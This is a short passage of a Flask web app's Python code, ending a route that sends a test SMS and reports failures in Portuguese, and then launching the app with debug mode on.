            session['test_result'] = f"Falha ao enviar SMS para {phone}. Verifique o número e tente novamente."
            session['test_success'] = False

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar SMS de teste: {str(e)}")
        session['test_result'] = f"Erro ao enviar SMS de teste: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)